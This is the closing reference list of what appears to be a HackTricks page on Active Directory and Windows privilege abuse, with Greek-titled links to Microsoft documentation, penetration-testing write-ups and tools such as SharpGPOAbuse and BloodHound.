- [10] [Microsoft Learn – Συνάρτηση ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — Ανώνυμο LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Παράρτημα C: Προστατευμένοι λογαριασμοί και ομάδες στο Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Πώς να καταχραστείτε και να δημιουργήσετε backdoor στο AdminSDHolder για να αποκτήσετε persistence ως Domain Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Κατάχρηση του προνομίου DnsAdmins για κλιμάκωση στο Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Πληροφορίες για την κατάχρηση της ακμής GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – Συνάρτηση NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
